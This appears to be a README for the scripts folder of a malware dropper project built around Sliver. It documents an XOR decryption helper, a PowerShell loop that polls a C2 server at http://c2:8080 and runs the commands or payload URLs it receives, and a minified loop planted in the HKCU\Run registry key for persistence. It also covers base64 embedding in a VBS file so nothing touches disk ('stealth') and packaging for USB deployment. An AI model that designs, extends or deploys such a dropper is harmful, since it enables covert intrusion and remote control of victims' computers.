# Scripts Directory - Separated by Language

This directory contains scripts organized by language to facilitate unit testing and cleaner code separation.

## Structure

### PowerShell Scripts

**`decrypt-xor.ps1`** (Shared utility)
- XOR decryption function
- Takes: base64-encoded data + key
- Returns: plaintext
- Used by: polling loops, tests

**`polling-loop.ps1`** (Scheduled task version)
- Parameterized polling loop for scheduled task execution
- Accepts: $Url, $Hostname, $Key
- Loads: decrypt-xor.ps1
- Behavior: polls C2, executes commands (DELETE, payload URL)
- Usage: `powershell -NoProfile -File polling-loop.ps1 -Url http://c2:8080 -Hostname DESKTOP-ABC`

**`registry-polling-inline.ps1`** (Registry version)
- Minified inline polling loop for HKCU\Run registry key
- Variables injected via string substitution: $url, $hostname
- Behavior: same as polling-loop.ps1, but optimized for registry constraints
- Note: contains all code inline (no file dependencies on target)

## Usage

### Development & Testing

```powershell
# Test decrypt function
. .\decrypt-xor.ps1
$encrypted = "aGHQ3Jk8mNp2XqRtYvWxZaBcDeFgHiJk="
Decrypt-XOR $encrypted "stealth-key-123"
# Output: DELETE

# Test polling loop (local C2 on localhost:8080)
. .\polling-loop.ps1 -Url "http://localhost:8080" -Hostname "TEST-HOST" -Key "stealth-key-123"
```

### Unit Tests

```powershell
# Example: test-decrypt-xor.ps1
. .\decrypt-xor.ps1

Describe "Decrypt-XOR" {
    It "decrypts base64 XOR data" {
        $encrypted = "aGHQ3Jk8mNp2XqRtYvWxZaBcDeFgHiJk="
        $result = Decrypt-XOR $encrypted "stealth-key-123"
        $result | Should -Be "DELETE"
    }
    
    It "handles invalid base64" {
        $result = Decrypt-XOR "invalid" "stealth-key-123"
        $result | Should -Be $null
    }
}

# Run: Invoke-Pester .\test-decrypt-xor.ps1
```

## Production Deployment

When embedded in `payload.vbs`:
1. Scripts are base64-encoded and embedded
2. At runtime on target, VBS decodes and executes inline
3. No file I/O needed on target (stealth)
4. Registry version uses minified inline code

## Integration Points

- **sliver-dropper-core.ps1** — Loads and uses these scripts during Install()
- **sliver-dropper-payload.vbs** — Base64-encodes scripts for embedding
- **deploy-to-usb.sh** — Packages scripts for USB deployment

## Key Design Decisions

✅ **Separation by language:** PowerShell scripts separate from VBS wrapper
✅ **Parameterization:** polling-loop.ps1 accepts parameters for testing
✅ **Reusable utilities:** decrypt-xor.ps1 shared across all polling loops
✅ **Minification:** registry-polling-inline.ps1 optimized for registry storage constraints
✅ **No file dependencies on target:** Scripts embedded, not read from disk

## Testing

Run all tests:
```bash
cd scripts/
powershell -NoProfile -Command "Invoke-Pester . -Show All"
```

Test individual function:
```bash
powershell -NoProfile -File test-decrypt-xor.ps1
```
